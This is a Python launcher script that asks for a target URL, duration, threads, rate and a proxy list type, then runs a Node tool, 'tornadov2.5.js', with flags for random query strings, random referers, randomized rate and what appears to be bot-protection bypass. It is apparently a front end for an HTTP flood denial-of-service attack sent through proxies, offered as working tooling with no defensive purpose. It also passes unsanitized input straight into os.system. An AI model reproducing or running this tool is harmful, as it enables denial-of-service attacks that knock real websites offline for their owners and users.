import os

def main():
    # Prompt the user for the URL
    url = input("Enter the URL: ")

    # Prompt the user for the connection type
    connection_type = input("Enter the connection type (http, https, mixlist, socks4, socks5): ").strip().lower()
    time = input("Enter the time: ")
    threads = input("Enter the threads: ")
    rate = input("Enter the ratelimit: ")

    # Determine the output file based on the connection type
    if connection_type == "http":
        output_file = "http.txt"
    elif connection_type == "https":
        output_file = "https.txt"
    elif connection_type == "mixlist":
        output_file = "mixlist.txt"
    elif connection_type == "socks4":
        output_file = "socks4.txt"
    elif connection_type == "socks5":
        output_file = "socks5.txt"
    else:
        print("Invalid connection type. Please enter one of the following: http, https, mixlist, socks4, socks5.")
        return

    # Construct the command
    command = f'node tornadov2.5.js GET "{url}?q=%RAND%" {time} {threads} {rate} {output_file} --query 1 --cookie "ISI=Operation910" --delay 1 --bfm true --referer rand --debug --randrate --full --legit'

    # Execute the command
    os.system(command)

if __name__ == "__main__":
    main()
